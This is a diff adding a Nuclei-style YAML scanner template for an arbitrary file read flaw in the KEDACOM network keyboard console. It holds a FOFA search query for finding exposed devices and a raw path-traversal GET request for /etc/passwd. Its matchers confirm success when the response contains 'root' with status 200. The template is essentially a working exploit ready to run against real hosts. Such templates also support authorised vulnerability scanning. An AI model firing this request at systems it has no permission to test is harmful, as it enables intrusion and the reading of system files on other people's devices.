@@ -1,0 +1,43 @@
+id: keda-wangluojianpankongzhitai-file-read
+
+info:
+  name: 科达-网络键盘控制台-任意文件读取漏洞
+  author: candada
+  severity: high
+  description: 'KEDACOM 网络键盘控制台存在任意文件读取漏洞，攻击这通过漏洞可以读取服务器任意信息。'
+  reference:
+    - https://www.saury.net/1983.html
+  tags: 2024,科达，file-read
+  metadata:
+    fofa-query: "网络键盘控制台"
+  classification:
+    cvss-metrics: 
+    cvss-score:                                                   
+    cve-id:                                              
+    cwe-id:                                                    
+    epss-score:                                              
+    epss-percentile:                                           
+    cpe:       
+
+http:
+  - raw:
+      - |+
+        GET /../../../../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
+        Accept: text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        X-Requested-With: XMLHttpRequest
+        Connection: close
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - root
+      - type: status
+        status:
+          - 200
